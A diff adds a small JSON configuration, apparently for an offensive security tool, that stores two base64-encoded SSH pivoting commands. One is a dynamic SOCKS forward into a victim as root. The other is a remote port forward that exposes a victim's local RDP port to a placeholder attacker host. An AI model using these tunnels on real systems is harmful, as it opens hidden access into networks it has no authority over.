@@ -1,0 +1,18 @@
+{
+    "command": {
+        "dynamic_forwarding": {
+            "description": "Dynamic SSH Forwarding. Attacker perspective. Open local port and SSH to victim",
+            "commands": [
+                "c3NoIC1EIDgwODggcm9vdEBYLlguWC5Y"
+            ]
+        },
+        "remote_port_forward": {
+            "description": "Remote port forwarding, exposing local port to attacker. SSH -> attacker machine from victim",
+            "commands": [
+                "c3NoIDxnYXRld2F5KGF0dGFja2VyIElQKT4gLVIgPHJlbW90ZSBwb3J0IHRvIGJpbmQ+Ojxsb2NhbCBob3N0Pjo8bG9jYWwgcG9ydD4KRVhBTVBMRTogc3NoIFguWC5YLlggLVIgMzM5MDoxMjcuMC4wLjE6MzM4OQ=="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
